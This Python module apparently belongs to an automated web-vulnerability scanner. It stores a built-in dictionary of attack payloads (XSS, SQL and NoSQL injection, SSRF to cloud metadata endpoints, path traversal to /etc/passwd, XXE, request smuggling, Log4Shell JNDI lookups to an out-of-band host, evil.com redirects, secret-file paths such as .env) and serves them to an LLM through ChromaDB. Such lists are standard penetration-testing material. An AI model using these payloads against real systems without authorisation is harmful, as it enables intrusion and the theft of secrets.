"""
RAG Payload Engine (Node 8)

Retrieval-Augmented Generation engine backed by ChromaDB.
Pre-loaded with safe payloads from SecLists and known CVE PoCs.
The LLM queries this database to fetch context-aware, safe payloads
instead of hallucinating them.
"""

from __future__ import annotations

import os
from typing import Any, Optional

import structlog

logger = structlog.get_logger("apexhunter.tools.rag_engine")

# ── Built-in safe payload collections ─────────────────────
# These are embedded directly so the tool works without SecLists
BUILTIN_PAYLOADS: dict[str, list[str]] = {
    "xss_reflection": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "{{7*7}}",
        "${7*7}",
        "<details open ontoggle=alert(1)>",
    ],
    "xss_dom": [
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "'-alert(1)-'",
        "\\'-alert(1)//",
    ],
    "sqli_error": [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "') OR ('1'='1",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ],
    "sqli_blind_boolean": [
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND SUBSTRING(@@version,1,1)='5'",
    ],
    "sqli_blind_time": [
        "1' AND SLEEP(5)--",
        "1' AND BENCHMARK(5000000,SHA1('test'))--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND pg_sleep(5)--",
    ],
    "nosqli": [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        "[$ne]=1",
        "[$gt]=",
        "[$regex]=.*",
        '{"$where": "1==1"}',
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/",
        "file:///etc/passwd",
        "dict://localhost:11211/stat",
        "gopher://localhost:6379/_INFO",
    ],
    "lfi": [
        "../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "..%252f..%252f..%252fetc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "/proc/self/environ",
        "/proc/self/cmdline",
    ],
    "idor_numeric": [
        "0",
        "1",
        "2",
        "-1",
        "99999",
        "100000",
        "null",
        "undefined",
        "NaN",
    ],
    "header_injection": [
        "test\r\nX-Injected: true",
        "test%0d%0aX-Injected:%20true",
        "test\r\nSet-Cookie: injected=true",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime()}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
    "open_redirect": [
        "//evil.com",
        "https://evil.com",
        "/\\evil.com",
        "////evil.com",
        "https:evil.com",
        "/redirect?url=https://evil.com",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OOB_URL">]><foo>&xxe;</foo>',
    ],
    "http_smuggling_clte": [
        "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
    ],
    "http_smuggling_tecl": [
        "POST / HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n1\r\nA\r\n0\r\n\r\n",
    ],
    "cache_poisoning": [
        "X-Forwarded-Host: evil.com",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Forwarded-Prefix: /admin",
    ],
    "jwt_alg_none": [
        '{"alg":"none","typ":"JWT"}',
        '{"alg":"None","typ":"JWT"}',
        '{"alg":"NONE","typ":"JWT"}',
        '{"alg":"nOnE","typ":"JWT"}',
    ],
    "cors_misconfiguration": [
        "Origin: https://evil.com",
        "Origin: null",
        "Origin: https://target.com.evil.com",
        "Origin: https://targetevilcom",
    ],
    "business_logic": [
        "-1",
        "0",
        "-99999",
        "99999999",
        "0.0001",
        "-0.0001",
        "NaN",
        "Infinity",
        "null",
        "undefined",
        "[]",
        "{}",
    ],
    "security_headers_check": [
        "Content-Security-Policy",
        "Strict-Transport-Security",
        "X-Content-Type-Options",
        "X-Frame-Options",
        "X-XSS-Protection",
        "Referrer-Policy",
        "Permissions-Policy",
        "Cross-Origin-Opener-Policy",
        "Cross-Origin-Resource-Policy",
        "Cross-Origin-Embedder-Policy",
    ],
    "sensitive_files": [
        ".git/HEAD",
        ".git/config",
        ".env",
        ".env.local",
        ".env.production",
        "config.php.bak",
        "web.config",
        "wp-config.php.bak",
        ".htaccess",
        ".htpasswd",
        "backup.sql",
        "dump.sql",
        "database.sql",
        "phpinfo.php",
        "info.php",
        "server-status",
        "server-info",
        ".DS_Store",
        "Thumbs.db",
        "crossdomain.xml",
        "clientaccesspolicy.xml",
        "robots.txt",
        "sitemap.xml",
        "swagger.json",
        "openapi.json",
        "openapi.yaml",
        "api-docs",
        "graphql",
        "graphiql",
        "__graphql",
        "altair",
        "playground",
    ],
    "prototype_pollution": [
        "__proto__[polluted]=true",
        "constructor[prototype][polluted]=true",
        "__proto__.polluted=true",
    ],
    "log4shell": [
        "${jndi:ldap://OOB_URL/a}",
        "${jndi:rmi://OOB_URL/a}",
        "${jndi:dns://OOB_URL/a}",
        "${${lower:j}ndi:${lower:l}dap://OOB_URL/a}",
    ],
}


class RAGEngine:
    """
    Retrieval-Augmented Generation engine for safe payloads.

    Uses ChromaDB to store and retrieve context-aware payloads.
    Falls back to built-in payload collections if ChromaDB is unavailable.
    """

    def __init__(self, chroma_dir: str = "/app/data/chromadb"):
        self._chroma_dir = chroma_dir
        self._collection = None
        self._initialized = False

    async def initialize(self) -> None:
        """Initialize the ChromaDB collection and load payloads."""
        try:
            import chromadb

            client = chromadb.PersistentClient(path=self._chroma_dir)
            self._collection = client.get_or_create_collection(
                name="apex_payloads",
                metadata={"hnsw:space": "cosine"},
            )

            # Load built-in payloads if collection is empty
            if self._collection.count() == 0:
                await self._load_builtin_payloads()

            # Load SecLists if available
            await self._load_seclists()

            self._initialized = True
            logger.info(
                "rag_engine_initialized",
                total_payloads=self._collection.count(),
            )
        except Exception as e:
            logger.warning(
                "rag_chromadb_unavailable",
                error=str(e),
                fallback="using built-in payloads",
            )
            self._initialized = False

    async def _load_builtin_payloads(self) -> None:
        """Load built-in payload collections into ChromaDB."""
        if not self._collection:
            return

        documents = []
        metadatas = []
        ids = []
        idx = 0

        for category, payloads in BUILTIN_PAYLOADS.items():
            for payload in payloads:
                documents.append(payload)
                metadatas.append(
                    {
                        "category": category,
                        "source": "builtin",
                        "safe": "true",
                    }
                )
                ids.append(f"builtin_{category}_{idx}")
                idx += 1

        if documents:
            # Add in batches of 100
            for i in range(0, len(documents), 100):
                batch_docs = documents[i : i + 100]
                batch_meta = metadatas[i : i + 100]
                batch_ids = ids[i : i + 100]
                self._collection.add(
                    documents=batch_docs,
                    metadatas=batch_meta,
                    ids=batch_ids,
                )

        logger.info("rag_builtin_loaded", count=len(documents))

    async def _load_seclists(self) -> None:
        """Load payloads from SecLists if the directory exists."""
        seclists_dir = "/app/data/seclists"
        if not os.path.exists(seclists_dir):
            logger.info("seclists_not_found", path=seclists_dir)
            return

        # Load specific useful files
        useful_files = [
            ("Discovery/Web-Content/common.txt", "directory_brute"),
            ("Discovery/Web-Content/api/api-endpoints.txt", "api_endpoints"),
            ("Fuzzing/XSS/XSS-Jhaddix.txt", "xss_advanced"),
            ("Fuzzing/SQLi/Generic-SQLi.txt", "sqli_advanced"),
        ]

        for rel_path, category in useful_files:
            full_path = os.path.join(seclists_dir, rel_path)
            if os.path.exists(full_path):
                try:
                    with open(full_path, "r", errors="ignore") as f:
                        lines = [
                            line.strip()
                            for line in f
                            if line.strip() and not line.startswith("#")
                        ]
                    # Only load first 1000 from each file
                    lines = lines[:1000]

                    if lines and self._collection:
                        documents = lines
                        metadatas = [
                            {"category": category, "source": "seclists", "safe": "true"}
                            for _ in lines
                        ]
                        ids = [f"seclists_{category}_{i}" for i in range(len(lines))]

                        for i in range(0, len(documents), 100):
                            self._collection.add(
                                documents=documents[i : i + 100],
                                metadatas=metadatas[i : i + 100],
                                ids=ids[i : i + 100],
                            )

                    logger.info(
                        "seclists_file_loaded",
                        file=rel_path,
                        payloads=len(lines),
                    )
                except Exception as e:
                    logger.warning("seclists_load_error", file=rel_path, error=str(e))

    def get_payloads(
        self,
        vuln_type: str,
        context: Optional[str] = None,
        max_results: int = 50,
    ) -> list[str]:
        """
        Retrieve payloads for a specific vulnerability type.

        Args:
            vuln_type: The vulnerability category (e.g., "sqli_error", "xss_reflection").
            context: Optional context string for semantic search.
            max_results: Maximum number of payloads to return.

        Returns:
            List of payload strings.
        """
        # Try ChromaDB first
        if self._initialized and self._collection:
            try:
                if context:
                    results = self._collection.query(
                        query_texts=[f"{vuln_type} {context}"],
                        n_results=max_results,
                        where={"category": vuln_type},
                    )
                else:
                    results = self._collection.get(
                        where={"category": vuln_type},
                        limit=max_results,
                    )

                docs = results.get("documents", [[]])
                if isinstance(docs[0], list):
                    return docs[0]
                return docs

            except Exception as e:
                logger.warning("rag_query_error", error=str(e))

        # Fallback to built-in payloads
        return BUILTIN_PAYLOADS.get(vuln_type, [])[:max_results]

    def get_all_categories(self) -> list[str]:
        """Return all available payload categories."""
        return list(BUILTIN_PAYLOADS.keys())
